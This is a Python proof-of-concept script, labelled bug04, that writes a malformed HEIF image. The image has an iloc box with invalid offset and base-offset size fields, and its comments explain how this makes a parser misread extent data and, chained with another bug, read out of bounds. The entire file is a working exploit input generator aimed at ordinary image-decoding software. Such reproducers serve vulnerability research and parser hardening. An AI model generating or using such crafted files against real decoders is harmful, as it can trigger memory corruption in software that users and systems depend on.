#!/usr/bin/env python3
"""bug04: iloc with all four field-size nibbles set to invalid (umbrella).
Chains with bug09: construction_method=1 + tiny idat means downstream
consumer sees bogus extent.length and OOBs."""

import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "common"))
import heif_box as hb


def main(out_path: str) -> None:
    idat_payload = b"\xAA" * 8

    # offset_size=5, length_size=4 (valid), base_offset_size=2,
    # index_size=0. With this mix the parser:
    #   - read16 base_offset (skipped) → 2 bytes left → become extent_count
    #   - read32 offset_size (skipped) → 5 bytes left
    #   - read32 length (valid) → reads first 4 of those 5 → bogus
    bogus_iloc = hb.iloc(
        version=1,
        offset_size=5,         # invalid
        length_size=4,         # valid
        base_offset_size=2,    # invalid
        index_size=0,
        items=[{
            "item_id": 1, "construction_method": 1, "data_reference_index": 0,
            "base_offset": 0x0001,
            "extents": [(0,
                         0x12345678_AB,    # 5 wire bytes — "offset" misread
                         0xCAFEBABE)],
        }])

    payload = (hb.hdlr(b"pict") + hb.pitm(1) +
               hb.empty_iprp() + hb.iinf([(1, b"hvc1")]) + bogus_iloc +
               hb.idat(idat_payload))
    out = hb.ftyp() + hb.fullbox(b"meta", 0, 0, payload)
    hb.write_file(out_path, out)


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "bug04_poc.heif")
